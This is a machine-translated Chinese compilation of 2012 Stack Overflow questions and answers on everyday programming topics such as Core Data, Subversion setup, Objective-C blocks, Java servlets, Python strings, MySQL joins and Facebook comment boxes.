[http://jsfiddle.net/Q3e9m/](http://jsfiddle.net/Q3e9m/)

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-08-05T23:19:05.497

对于初学者，请尝试在代码中使用 html 修复错误。您的代码缺少一些引号，并且标签中的样式属性已被弃用。

```
<html>
<head>
    <style>
        .cardc {
            border: 5px outset white;
            padding: 3px;
            width:80%;
        }
    </style>
</head>
<body>
    <table class='cardc' style="height:100px;">
        <tr>
            <td style="width:10%">
                <img src='http://fwfn.ca/sites/default/files/pictures/blank_person.jpg' style="height:120px;width:100px;"/>
            </td>
        </tr>
        <tr>
            <td>
            </td>
        </tr>
    </table>
</body> 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-08-06T00:02:19.103

缺少引号和单位。您需要指定您的值是像素还是 ems ....尝试使用颜色编码代码，例如 #fff 或 rgb(255 255 255) 而不是白色。

# ios - 在 Core Data SQLite 持久存储上使用 Sqlite3 VACUUM 命令

> ID：11820834
> 
> 赞同：2
> 
> 时间：2012-08-05T23:04:39.970
> 
> 标签：ios, core-data, sqlite, vacuum

在我们的应用程序中，我们正在通过网络/电子邮件实现部分 Core Data SQLite 数据库的共享。为了保持文件较小，我实现了以下方法来缩小 Core Data 数据库。

```
 - (void) shrinkDB
    {
        sqlite3 * database;
        NSString * string = [shareStoreURL path];
        const char * filename = [string cStringUsingEncoding:[NSString defaultCStringEncoding]];
        char *errMsg;
        if (sqlite3_open(filename, &database) == SQLITE_OK)
        {
            NSLog(@"Shrinking...");
            if (sqlite3_exec(database, "VACUUM;", NULL, NULL, &errMsg) != SQLITE_OK)
            {
                NSLog(@"Failed execute VACUUM");
            }
            sqlite3_close(database);
         }
        } 
```

问题：上面的代码确实缩小了数据库。但苹果表示，Core Data 的实施细节随时可能发生变化。你认为我在可预见的未来使用这种方法会安全吗？或者有没有其他更好的解决方案？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-05T23:50:06.560

执行此操作的正确方法是将 NSSQLiteManualVacuumOption 提供给持久存储协调器。

来自文档的片段：

> **NSSQLiteManualVacuumOption**
> 
> 重建存储文件的选项键，在将存储添加到协调器时强制进行数据库范围的碎片整理。这会调用 SQLite 的 VACUUM 命令。它被 SQLite 存储以外的存储忽略。在 OS X v10.6 及更高版本中可用。在 NSPersistentStoreCoordinator.h 中声明。

看到这个：[https ://developer.apple.com/library/mac/#documentation/Cocoa/Reference/CoreDataFramework/Classes/NSPersistentStoreCoordinator_Class/NSPersistentStoreCoordinator.html](https://developer.apple.com/library/mac/#documentation/Cocoa/Reference/CoreDataFramework/Classes/NSPersistentStoreCoordinator_Class/NSPersistentStoreCoordinator.html)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-06T00:11:23.077

Apple 如何在 SQLite 数据库中构建持久数据是一个可能会发生变化的实现细节。但是，SQLite 管理已删除记录的方法与 Apple 的实现无关。

话虽如此，清理 SQLite 数据库的过程会导致重建整个数据库，如果 CoreData NSPersistentStoreCoordinator 正在使用 sqlite 文件，这可能会产生负面影响。

在您的情况下，听起来您想在保存更改之后但在通过电子邮件发送之前进行清理。使用 NSSQLiteManualVacuumOption 选项似乎仅在最初打开 SQLite 文件时清理数据库。

我要么在文件不再与 NSPersistentStoreCoordinator 关联后运行上述代码，要么使用 NSSQLiteManualVacuumOption 然后重新打开并关闭文件，然后再通过电子邮件发送。

另一种选择是使用外部 SQLite 工具（例如 OS X 上的 Base）来手动清理文件。我过去也使用过 Firefox SQLite 管理器扩展。

# apache - TortoiseSVN 无法连接

> ID：11820835
> 
> 赞同：3
> 
> 时间：2012-08-05T23:04:53.773
> 
> 标签：apache, svn, tortoisesvn

我有一个在共享主机 linux 帐户上运行的 apache svn 服务器。

症状是我可以使用 PuTTY 连接到托管 svn 的服务器，但 TortoiseSVN 存储库浏览器无法连接。

我试过svn，svn+ssh，

如果我只尝试 svn，我会得到：

> E730060：无法连接到 URL 'svn://50.97.138.99:36901 /test' 的存储库 svn：E730060：无法连接到主机 '50.97.138.99'：连接尝试失败，因为连接方没有正确一段时间后响应，或建立连接失败，因为连接的主机没有响应。

如果我尝试 svn+ssh，我会反复提示输入密码，最终不得不多次取消 pwd 对话框，错误是：

> 无法连接到位于 URL 'svn+ssh://wren.arvixe.com' 的存储库 为了更好地调试连接问题，请在 Subversion 配置文件的 [tunnels] 部分中从 ssh 中删除 -q 选项。网络连接意外关闭

我已经整整两天都在做这件事，用谷歌搜索我的心，开始变得神志不清。

谢谢你的帮助。我很乐意提供更多细节/做实验等。我不知道任何人想要开始的细节，如果最初没有足够的细节，很抱歉。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-06T03:13:35.860

关于如何访问您的存储库似乎有些混乱。`svn+ssh://`如果没有人设置，您不能简单地浏览。有人设置了吗？

我很惊讶您可以通过 SSH（使用 PuTTY）登录服务器，因为它是共享托管服务器。这通常是不允许的。大多数共享主机站点不允许 shell 访问。

您在开场白中提到了***apache svn 服务器。***然后，您同时尝试`svn://`和`svn+ssh://`。设置 Subversion 服务器和访问 Subversion有**四种不同的方法：**

*   [使用 Apache httpd 作为服务器](http://svnbook.red-bean.com/en/1.7/svn.serverconfig.httpd.html#svn.serverconfig.httpd.prereqs)。为此，您需要正确配置和编译 Apache httpd。您需要几个*Apache 插件*，例如`mod_dav_svn.so`和`mod_dav.so`. 你有这个设置吗？如果你这样做，你需要访问你的存储库，`http://`而不是`svn://`你显示的。
*   [用作`svnserve`服务器](http://svnbook.red-bean.com/en/1.7/svn.serverconfig.svnserve.html)。这很容易设置。如您所见，您可以访问您的存储库`svn://`。有人配置`svnserve`并运行它吗？
*   [在 ssh 上使用 svnserve](http://svnbook.red-bean.com/en/1.7/svn.serverconfig.svnserve.html#svn.serverconfig.svnserve.sshauth)。这使用, 但与Unix 文件访问`svnserve`集成并可以使用。`ssh`这设置起来非常非常棘手，而且我看到很少有人实际使用它。每个用户在访问存储库时都会启动自己的`svnserve`进程。存储库可以直接访问它，您必须设置个人帐户以防止任何 shell 访问。否则用户可以直接操作存储库。
*   [使用直接文件访问](http://svnbook.red-bean.com/en/1.7/svn.basic.in-action.html#svn.basic.in-action.wc.tbl-1)在共享存储库时强烈建议不要这样做，因为必须授予所有用户对存储库的直接读/写访问权限。

问题是，如果不知道如何在您的系统上设置 Subversion，就无法帮助您。您是否创建了存储库？如果是这样，您是否启动了`svnserve`访问它的进程？其他人是否在该系统上设置了您的 Subversion 存储库？如果其他人设置了存储库，您必须从他们那里获得有关如何访问它的确切说明。

如果您是设置存储库的人，您是设置了 Apache 还是设置了 svnserve？如果你有 setup `svnserve`，你是使用默认端口 3690，还是设置另一个端口来使用？你能确定这个端口是否被你的防火墙阻止了吗？您可以使用`telenet`命令尝试直接访问端口：

C> 远程登录 50.97.138.99 3690

如果您无法连接，您将看到“无法连接到远程主机”消息，这意味着要么`svnserve`没有运行，要么您的防火墙阻止了该端口。由于您可以登录服务器，因此请尝试登录服务器并直接访问该存储库：

$ svn 日志 svn://localhost

如果您可以访问 repo，则说明您已运行 svnserve，但您的防火墙阻止了它。如果你不能访问`svnserve`，你可能没有运行它。

试试看，看看你会得到什么。

# iphone - 块句之外的变量使用

> ID：11820836
> 
> 赞同：0
> 
> 时间：2012-08-05T23:05:09.147
> 
> 标签：iphone, objective-c

这是关于块句的问题。我的问题是如何在块语句中获取变量。请看我的代码。下面的代码效果不佳。

```
__block NSURL *ssURL
AFJSONRequestOperation *operation = 
[AFJSONRequestOperation JSONRequestOperationWithRequest:request success:^(NSURLRequest *request, NSHTTPURLResponse *response, id JSON) {
    ssURL = [NSURL URLWithString:[JSON valueForKeyPath:@"screenshot"]];
    [self currentEntry].ogImageURL = ssURL;
    NSLog(@"%@", ssURL); // -> "http://correct.address"   
} failure:nil];
[operation start]; 
```

此外，我将变量 ogImageURL 设置如下：

```
@property (copy, atomic) NSURL *ogImageURL; 
```

在完成块之外，NSLog 明显显示“（null）”。我想在语句块之外使用变量。这很奇怪。

我必须从块外部获取变量，因为我想创建表格视图，其中单元格调用以获取数组的自我信息。

```
- (UITableViewCell *)tableView:(UITableView *)tableView cellForRowAtIndexPath:(NSIndexPath *)indexPath
{
    UITableViewCell *cell = nil;
    if (indexPath.row < self.itemsArray.count) {
        cell = [tableView dequeueReusableCellWithIdentifier:@"Cell"];

        UIImageView *imageViewOgImage = (UIImageView *)[cell viewWithTag:5];
        NSURL *ogImageURL = [[self.itemsArray objectAtIndex:indexPath.row] ssURL]; 
```

完整来源是第 186 行：[https ://github.com/weed/p120711_TechMovie/blob/120723/TechMovie/RSSParser.m](https://github.com/weed/p120711_TechMovie/blob/120723/TechMovie/RSSParser.m)

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-05T23:09:42.940

这不是范围问题，这是时间问题

在第一个示例中，图像视图是在块内设置的，这意味着它只会在`ssURL`设置值之后发生

在第二个示例中，创建了块，但在设置图像视图之前不调用该块。该块是异步的，因此不会立即调用：它在操作返回响应时运行。如果您基于 JSON 请求操作设置图像视图，则必须在设置操作结果后完成（即在完成块内）

如果你的tableview依赖于操作的结果，那么设置ssURL的值然后在block里面，重新加载table view

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-05T23:11:25.467

我假设`AFJSONRequestOperation` `JSONRequestOperationWithRequest`是一个异步方法，在这种情况下，在第二个示例中，您将设置 self.imageView 为`self.ssURL`您分派`JSONRequestOperation`. 您必须在成功完成块中设置图像，就像在第一个示例中所做的那样。

# java - servlet 是单例吗？

> ID：11820840
> 
> 赞同：31
> 
> 时间：2012-08-05T23:05:20.807
> 
> 标签：java, servlets

阅读一些书说 servlet 从容器端是单例的。这是真的？

然而，即使它是一个单例，我们也需要处理数据同步等

* * *

## 回答 #1

> 赞同：25
> 
> 时间：2012-08-05T23:10:49.027

[查看Cunningham & Cunningham, Inc. Wiki](http://c2.com/cgi/wiki?SingletonPattern)中定义的单例模式的定义

> 确保一个类只有一个实例，并提供一个全局访问点。

我会说，不。从容器的角度来看，一个 servlet 对象被接受和管理，包括创建一个[ServletContext](http://docs.oracle.com/javaee/6/api/javax/servlet/ServletContext.html)，但这并不妨碍 servlet 的实例不超过一个。

关于此类问题，我认为最好查看相应的合同，这是在[Java Servlet Specification](http://jcp.org/en/jsr/detail?id=315)中定义的 servlet 的情况下。他们已经解决了 servlet 实例的数量。

> **2.2 实例数**
> 
> 通过第 8 章“注解和可插入性”中描述的注解或第 14 章“部署描述符”中描述的包含 servlet 的 Web 应用程序的部署描述符的一部分，servlet 声明控制 servlet 容器的方式提供 servlet 的实例。**对于不在分布式环境中托管的 servlet（默认设置），servlet 容器必须在每个 servlet 声明中仅使用一个实例。但是，对于实现 SingleThreadModel 接口的 servlet，servlet 容器可能会实例化多个实例来处理繁重的请求负载并将请求序列化到特定实例。**
> 
> 在将 servlet 作为部署描述符中标记为可分发的应用程序的一部分部署的情况下，对于每个 Java 虚拟机 (JVM™) 的每个 servlet 声明，容器可能只有一个实例。但是，如果可分发应用程序中的 servlet 实现了 SingleThreadModel 接口，则容器可以在容器的每个 JVM 中实例化该 servlet 的多个实例。

它只指定容器只能使用一个实例（在前一种情况下），正如*EJP在**评论*中指出的那样：

> Servlet 规范中没有任何内容可以阻止您在同一个 Web 应用程序中以不同的名称重新实例化同一个 servlet 类。因此，不是单身人士。

**参考** [Java Servlet 规范 3.0 MR](http://jcp.org/en/jsr/detail?id=315) (p.6-7)

* * *

## 回答 #2

> 赞同：15
> 
> 时间：2012-08-05T23:56:21.333

不，您可以在同一个 Web 容器中，甚至在同一个 Web 应用程序中，以不同的 servlet 名称和 URL 多次实例化同一个 servlet 类。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2021-01-24T04:04:51.190

Servlet 可以初始化为单个实例或实例池。

以下是 <<Java Platform, Enterprise Edition The Java EE Tutorial Release 7>> 的摘录：

Web 容器通常会创建一个线程来处理每个请求。为了确保 servlet 实例一次只处理一个请求，servlet 可以实现 SingleThreadModel 接口。如果 servlet 实现了这个接口，那么在 servlet 的 service 方法中不会有两个线程同时执行。Web 容器可以通过同步对 servlet 的单个实例的访问或通过维护 Web 组件实例池并将每个新请求分派到一个空闲实例来实现此保证。

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2014-06-11T19:12:09.450

不，Servlet 不是单例。它可能会创建第二个 Object ，这取决于传入的请求和容器的行为。

# macos - 如何配置 Go 以便它可以访问 OSX 中的环境变量

> ID：11820842
> 
> 赞同：4
> 
> 时间：2012-08-05T23:05:30.953
> 
> 标签：macos, go, environment-variables, fish

我正在 OSX 10.7.4 上开发。

我在让“go get”命令工作时遇到了一些问题。在试图找出问题所在的过程中，我意识到 Go 在读取 $PATH 环境变量时遇到了问题。

以下脚本显示了该问题：-

（PATH 作为空字符串返回，syscall.Getenv 返回 ok=false）

```
package main

import (
    "os"
    "syscall"
    "fmt"
)

func main() {

    path := os.Getenv("PATH")
    fmt.Println(path)

    syscall_path, ok := syscall.Getenv("PATH")
    fmt.Println(syscall_path)
    fmt.Println(ok)

} 
```

我无法想象这是一个错误，因为它太戏剧化而无法被忽视。所以我的问题是：我现在以什么方式愚蠢？

:-)

即我需要做什么才能让 Go 访问环境变量？

- 更新：

事实证明，这实际上是我的 shell 的问题 - Homebrew 也停止工作，并显示错误消息：

```
/usr/local/Library/Homebrew/global.rb:95: private method `split' called for nil:NilClass (NoMethodError)
    from /usr/local/bin/brew:10:in `require'
    from /usr/local/bin/brew:10 
```

我认为问题源于我使用了鱼壳，它似乎没有像我预期的那样设置环境。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-06T15:35:31.030

事实证明，这是一个格式错误的 ~/.config/fish/config.fish 文件。

我正在使用：

```
set -g VARNAME value 
```

而应该是：

```
set VARNAME value 
```

# python - Python：为什么要取消这项工作？

> ID：11820843
> 
> 赞同：-5
> 
> 时间：2012-08-05T23:05:32.113
> 
> 标签：python

所以我有一小段代码不起作用：

```
 while c<b:
     str2 += str1[c]
     c+=1

print str2 
```

b 是我想复制到 str2 的 str1 的长度，c 是我想从 str1 开始传输的点，那么 while 循环应该只是将所有字符从 str1 传输到 str2。

由于某种原因，我似乎无法打印 str2 并收到此错误消息：

“NameError：名称'str2'未定义”

我的猜测是我只是在做一些简单的错误，我刚刚开始尝试使用 Python，并且之前只真正做过 C#。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-05T23:08:32.607

更好的方法是对字符串进行切片：

```
str2 = str1[c:b] 
```

`str1`这将从字符号复制到`c`字符号。`b``str2`

例如：

```
>>> 'Hello World'[3:7]
'lo W' 
```

这里有一点关于 Python 的切片表示法的信息：[Explain Python's slice notation](https://stackoverflow.com/questions/509211/good-primer-for-python-slice-notation)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-05T23:07:15.990

你必须初始化`str2`：

```
str2 = ''
while c<b:
    str2 += str1[c]
    c+=1

print str2 
```

或者做一个接收`str2`作为参数的函数：

```
def myfunc(str2=''):
    while c<b:
        str2 += str1[c]
        c+=1

    return str2 
```

其中`str2`参数默认初始化为`''`，即空字符串。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-05T23:08:39.307

和

```
str2 += str1[c] 
```

您是在说，“请将 str1[c]”添加到已经存在的任何内容中`str2`。问题是您尚未`str2`使用任何内容进行初始化（至少在您显示的代码中）。

最简单的解决方法是`str2`在循环中使用它之前给出一个初始值，例如，`str2=''`

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-05T23:09:45.837

为什么不使用以下内容：

```
str2 = str1[c:] 
```

# mysql - 组合四个表 - MySQL

> ID：11820844
> 
> 赞同：0
> 
> 时间：2012-08-05T23:05:39.960
> 
> 标签：mysql, join

我需要从课后活动计划数据库中的四个表中提取数据：时间表、活动、儿童和父母。

计划包含一个主键、对活动的引用和对子项的引用。

首先，我需要从活动表中为我选择的活动获取一个 ID（例如，搜索“足球”并获取相应的 ID）。然后，我需要使用它在 Schedule 表中搜索正在执行该活动的每个孩子并显示这些详细信息。Children 表中的每个条目都包含对 Parent 的引用。我最后需要提取这个引用，这样我就可以显示孩子父母的名字。

最终结果应如下所示：

```
activity_id | child_name | parent_name 
```

非常感谢所有建议！:)

仅供参考，这是我的表模式：

```
<!--CREATE CHILD TABLE-->

CREATE TABLE Child (
    id INT AUTO_INCREMENT NOT NULL PRIMARY KEY,
    forename VARCHAR(30) NOT NULL,
    surname VARCHAR(30) NOT NULL,
    gender ENUM('male', 'female') NOT NULL,
    dob DATE NOT NULL,
    guardian INT NOT NULL,
)

<!--CREATE GUARDIAN TABLE-->

CREATE TABLE Guardian (
    id INT AUTO_INCREMENT NOT NULL PRIMARY KEY,
    title VARCHAR(5) NOT NULL,
    forename VARCHAR(30) NOT NULL,
    surname VARCHAR(30) NOT NULL,
    address1 VARCHAR(30) NOT NULL,
    address2 VARCHAR(30),
    town VARCHAR(30) NOT NULL,
    county VARCHAR(30),
    postcode VARCHAR(10) NOT NULL,
    telephone VARCHAR(20) NOT NULL
)

<!--CREATE ACTIVITY TABLE-->

CREATE TABLE Activity (
    id INT AUTO_INCREMENT NOT NULL PRIMARY KEY,
    name VARCHAR(30) NOT NULL,
    day ENUM('Monday', 'Tuesday', 'Wednesday', 'Thursday', 'Friday', 'Saturday', 'Sunday') NOT NULL
)

<!--CREATE SCHEDULE TABLE-->

CREATE TABLE Schedule (
    id INT AUTO_INCREMENT NOT NULL PRIMARY KEY,
    child_id INT NOT NULL,
    activity_id INT NOT NULL,
    date DATE NOT NULL
) 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-05T23:30:12.777

```
SELECT Activity.id, Child.forename, Child.surname, Guardian.forename, Guardian.surname
  FROM Activity
  INNER JOIN Schedule ON Schedule.activity_id = Activity.id
  INNER JOIN Child ON Schedule.child_id = Child.id
  INNER JOIN Guardian ON Child.guardian_id = Guardian.id
  WHERE Activity.name = 'football' 
```

# java - 使用 libgdx 渲染椭圆

> ID：11820848
> 
> 赞同：2
> 
> 时间：2012-08-05T23:06:16.070
> 
> 标签：java, libgdx

我正在尝试使用 ShapeRenderer 渲染椭圆，并提出了以下部分解决方案：

```
void drawEllipse(float x, float y, float width, float height) {
    float r = (width / 2);
    ShapeRenderer renderer = new ShapeRenderer();
    renderer.setProjectionMatrix(/* camera matrix */);
    renderer.begin(ShapeType.Circle);
    renderer.scale(1f, (height / width), 1f);
    renderer.circle(x + r, y, r);
    renderer.identity();
    renderer.end();
} 
```

这会在指定坐标处以正确的宽度和高度绘制一个椭圆；但是，似乎比例变换会导致圆在视口中平移，而我未能成功确定平移背后的数学原理。我正在使用 y-up 的正交投影，其中坐标映射到屏幕上的一个像素。我对OpenGL不是很熟悉。

如何使用 libgdx 绘制椭圆，并让它在我指定的确切坐标处绘制椭圆？理想情况下，这意味着如果椭圆包含在矩形中，则椭圆的原点位于左上角。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-07-04T06:33:13.247

新的 Libgdx `ShapeRenderer`API（当前的 nightlies，在 v0.9.8 之后的任何版本中）包含一个[椭圆绘图方法](http://libgdx.badlogicgames.com/nightlies/docs/api/com/badlogic/gdx/graphics/glutils/ShapeRenderer.html#ellipse%28float,%20float,%20float,%20float,%20int%29)，因此您可以忽略此答案的其余部分。不过，该`ShapeRenderer`方法在其他方面也发生了变化（例如，`ShapeType`is just `Filled`、`Line`或`Point`now）。

对于那些坚持使用旧 API 的人，您应该能够通过确保缩放发生在原点周围来解决失真问题。这是一个标准的 OpenGL 实践（所以它有点迟钝，但他们遵循 OpenGL 的领导）。请参阅[矩阵变换的 Opengl 顺序](https://stackoverflow.com/questions/15993339/opengl-order-of-matrix-transformations)和[OpenGL：缩放然后平移？如何？](https://stackoverflow.com/questions/2258910/opengl-scale-then-translate-and-how). 更好的是（再次是标准的 OpenGL 实践），您最终会以您希望它们发生的相反顺序列出操作，因此要制作一个圆圈，将其扭曲为椭圆，然后将其移动到您实际编写代码的特定目标，例如：

```
renderer.begin(ShapeType.Circle);
renderer.translate(x, y, 0);
renderer.scale(1f, (height/width), 1f);
renderer.circle(0, 0, r);
renderer.end(); 
```

# python - Python：在 csv 行中写入 int 和 list

> ID：11820849
> 
> 赞同：0
> 
> 时间：2012-08-05T23:06:49.453
> 
> 标签：python, list, csv

也许这个问题太天真了，但让我很难受！我想`csv`在循环中将 2 个浮点值和一个 int 列表写入文件中的一行。在尝试写入文件之前，该文件可能存在也可能不存在。如果没有，则应创建一个新文件。这就是我正在做的事情：

```
f = open('stat.csv','a')
try:
    writer=csv.writer(f,delimiter=' ',quoting=csv.QUOTE_MINIMAL)
    writer.writerow((some_float1,some_float2,alist))
finally:
    f.close() 
```

哪里`alist = [2,3,4,5]`。我得到以下输出：

```
 some_float1 some_float2 "[2,3,4,5]" 
```

我想要的是这样的：

```
 some_float1 some_float2 2 3 4 5 
```

即我想摆脱`""`, 方括号并使分隔符始终保持一致。有什么建议么 ？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-05T23:08:56.630

怎么样：

```
writer.writerow([some_float1, some_float2] + alist) 
```

# codeigniter - Codeigniter Datamapper 未对具有 NULL 值的字段运行获取规则

> ID：11820850
> 
> 赞同：1
> 
> 时间：2012-08-05T23:06:58.503
> 
> 标签：codeigniter, codeigniter-datamapper

我将[Datamapper](http://datamapper.wanwizard.eu/) v1.8.2 与 Codeigniter v2.1.2 一起使用，并且有一个[“get”规则](http://datamapper.wanwizard.eu/pages/getrules.html)，它似乎不会在具有`NULL`值的字段上运行。这是模型：

```
class Page extends Datamapper {

    public $validation = array(
        'name' => array(
            'rules' => array('required'),
            'get_rules' => array('get_page_name')
        )
    );

    function _get_page_name($field)
    {
        $this->$field = 'TESTING '.$this->id;
    }

} 
```

示例代码：

```
$page = new Page();
foreach ($page->get() as $p) echo $p->name; 
```

当表字段`name`具有任何非空值（包括空字符串）时，它可以正常输出类似`TESTING 358`的内容，但是当值为`NULL`（这是该字段的默认值）时，它什么也不输出。使用没有区别`get_iterated()`。

我想我可以通过更改默认值来解决这个问题，但我想知道我是否做错了什么或错过了文档中的某些内容，或者它可能是一个错误？有谁知道问题是什么？

此外，如果有人能指出我在 CI 论坛中为 Datamapper 1.8.2 提供支持的正确线程，那将是很棒的，我正试图找到它并迷失在指向旧版本 DM 线程的迷宫链接中。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-06T06:30:44.780

您需要将其添加`allow_null`到`get_rules`数组中才能使其工作。我不确定创建者的意图，但这就是[get_rules 的实现方式](https://github.com/WanWizard/sparks-datamapper/blob/master/libraries/datamapper.php#L6398-L6400)（但是我没有在文档中看到它）。

# java - 这个语句在 Java 中是什么意思？

> ID：11820862
> 
> 赞同：0
> 
> 时间：2012-08-05T23:08:47.473
> 
> 标签：java

假设有一个数组声明：

```
int [] a = new int[3]; 
```

我正在读一本书，它说我们需要在运行时显式创建数组的原因是因为我们不知道在编译时要为数组保留多少空间。那么，在上面的这种情况下，我们不知道我们需要保留底层 java 平台的 int 大小的 3 倍吗？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-05T23:12:34.547

> 那么，在上面的这种情况下，我们不知道我们需要保留底层 java 平台的 int 大小的 3 倍吗？

好吧实际上比这多一点 - 因为数组是具有类引用以及长度的对象。

但是，是的，*在这种情况下*，您碰巧事先知道尺寸。但 Java 也允许您编写：

```
int[] a = new int[getLengthFromMethod()]; 
```

...在这种情况下，不，在编译时*不会*知道内存量。这种灵活性使得使用数组比在编译时必须知道大小要简单得多。（例如，想象一下尝试以`ArrayList`其他方式工作。）

但请记住，Java 中的内存分配通常是非常动态的 - 它实际上只是预先知道的堆栈帧的大小，然后只是相对而言（因为引用的大小可能因平台而异）。所有^(1 个)对象都分配在堆上，并使用引用来跟踪它们。

* * *

¹好的，除了智能 JVM，它们有时能够在执行逃逸分析后进行内联分配。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-05T23:12:06.507

在那本书中，它可能说在某些情况下，您在编译时不知道数组有多大（例如：当您向用户询问一组数字时，您不知道他将插入多少个数字）。

在您的示例（`int [] a = new int[3]`）中，您显然知道编译时数组的大小；是 3。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-05T23:12:20.863

是的。你的正确。

```
3 * sizeOf(int) + array overhead. 
```

您正在保留那么多内存，然后将指向第一个位置的指针传递给变量 a。然后可以找出如何根据存储的位置和大小来索引数组。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-05T23:29:57.387

在您的情况下，数组的大小是 3。方括号内的数字是大小。在 www.codejava.co.uk 上查看本周关于数组的教程

* * *

## 回答 #5

> 赞同：-2
> 
> 时间：2012-08-05T23:12:46.730

您确定您正在阅读的那本书是关于 Java 的吗？

与 C/C++ 不同，Java 没有这种困境 - 数组总是在运行时分配，即使您在编译时知道它们的大小。

# html - 如何制作一个跨越文档整个高度的 div，即使它不包含任何内容？

> ID：11820865
> 
> 赞同：0
> 
> 时间：2012-08-05T23:08:53.797
> 
> 标签：html, css, height, css-position

我想要一个名为“内容”的 div，它从页面顶部开始向下延伸到底部，即使没有其他内容。我试图弄清楚如何使用非常简单的 CSS 来做到这一点，所以我可以在我现有的网站上实现它。这是我一直在玩的代码：

```
html {
    position: absolute;
    top: 0;
    bottom: 0;
    left: 0;
    right: 0;
}
body {
    position: absolute;
    top:0;
    bottom: 0;
    left: 0;
    right: 0;

}
#content
{
    position: relative;
    top: 0;
    margin: 0 auto;
    border: 1px solid red;
    width: 70%
} 
```

这将创建一个 div，但它最终只是屏幕顶部的一条红线。如果我添加`height: 900px;`那么它将起作用，但我试图不使用特定的测量值。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-05T23:12:01.787

怎么样`#content { height: 100%; ... }`？

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-05T23:26:17.573

使用`min-height:100%`它以便它可以在必要时增长，并删除所有其他规则（它们没有做任何事情）。

# facebook - 带有 Facebook 评论框的通知

> ID：11820870
> 
> 赞同：1
> 
> 时间：2012-08-05T23:09:10.410
> 
> 标签：facebook, facebook-graph-api, facebook-javascript-sdk, facebook-comments

我一直在这里阅读其他相关问题，但我认为它们对于我在 Facebook 的编码等方面的情况来说甚至太先进了......

我想在我的网站上有一个 Facebook 评论框。这没问题，它工作正常。当有人发表评论时，我还希望在 Facebook 上收到通知。我用 comment.create 尝试了很多不同的东西，但我真的不知道我在做什么。

有人可以逐步指导我并帮助我了解我需要做什么吗？这是我所拥有的：

```
<body>
  <script>
    (function(d, s, id) {
    var js, fjs = d.getElementsByTagName(s)[0];
    if (d.getElementById(id)) return;
    js = d.createElement(s); js.id = id;
    js.src = "//connect.facebook.net/en_US/all.js#xfbml=1&appId=362160727158879";
    fjs.parentNode.insertBefore(js, fjs);
    }
  </script>

  <div class="fb-comments" data-href="{site name}" data-num-posts="10" data-width="650" notify="true"></div> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-10T01:00:51.147

WX，我在 Facebook 上有一个分类广告应用。我还需要向广告所有者创建一些通知。我用一种简单的方法解决了这个问题，在发表评论后，我使用 Ajax 和 Jquery 操作来自 FB 的响应：

```
FB.Event.subscribe('comment.create', function(response) {

    //Send an email with ajax

    $.ajax({
            type: "POST",
            url: "sendcommentemail.php?",
            data: "urlofpage=", 
            beforeSend:  function() {
                $('#loading').show();

        },
            success: function(html){
                $('#loading').hide();
        },
            error: function(html){
        }
    });
}); 
```

祝你好运！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-19T23:53:19.627

您只需在页面的应用设置中添加一个朋友作为版主。每次有人在您的网站上发表评论时，他/她都会在其 Facebook 个人资料中收到通知。

此外，此工具非常方便，并被拥有开发者帐户的人收藏： [https ://developers.facebook.com/tools/comments](https://developers.facebook.com/tools/comments)

# wordpress - WordPress 将源代码插入到帖子中会产生不良结果

> ID：11820877
> 
> 赞同：0
> 
> 时间：2012-08-05T23:09:46.217
> 
> 标签：wordpress, wordpress-theming

我是 WordPress 初学者。我想在一篇文章中插入 CSS 代码，但我的行号太大。 ![在此处输入图像描述](../Images/6d67bb78191defefe6c7b9cb8d45b311.png)

我在 wordpress 中写了这个：

```
[sourcecode language="css"]
#button{
      font-weight: bold;
      border: 2px solid #fff;
}

[/sourcecode] 
```

我想要这样的东西：

![在此处输入图像描述](../Images/b45a7ab82008ffba5dbc12279db4bb77.png)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-05T23:23:58.333

WordPress 的源代码生成器使用表格进行布局，因此如果您有任何影响任意表格元素的 CSS，那么它也会影响您的源代码的布局。

# facebook - 启用了安全组件的 CakePHP 和 Facebook

> ID：11820883
> 
> 赞同：1
> 
> 时间：2012-08-05T23:10:30.237
> 
> 标签：facebook, cakephp, cakephp-2.0

我想要打开安全组件。

但是，当您在 Facebook 选项卡中加载 CakePHP 应用程序时，FB 会将 $_REQUEST['signed_request'] 发布到我的表单 - 问题是安全组件对这个“帖子”“做出反应”并给我验证错误，黑色 -孔等

我该如何解决这个问题？

我在文档中找不到任何内容来解决这个问题。

我想要的是以某种方式“手动”运行安全组件，以便它仅在我实际提交表单时“做出反应”，而不是当 Facebook 将 $_REQUEST['signed_request'] 发布到我的表单时。

更新：

```
<?php
App::uses('CakeEmail', 'Network/Email');

class PagesController extends AppController {
    public $helpers = array('Html','Form');
    public $components = array('RequestHandler');

    public function beforeFilter() {
        parent::beforeFilter();
        $this->Auth->allow('*');

         $this->Security->validatePost = true;
         $this->Security->csrfCheck = true;
         $this->Security->unlockedFields[] = 'signed_request';
    }

    public function home() {
        $this->loadModel('Memberx');
                if($this->request->is('post') && isset($this->request->data['Memberx']['name'])) {
                 //...save here, etc. ...
                }
    } 
```

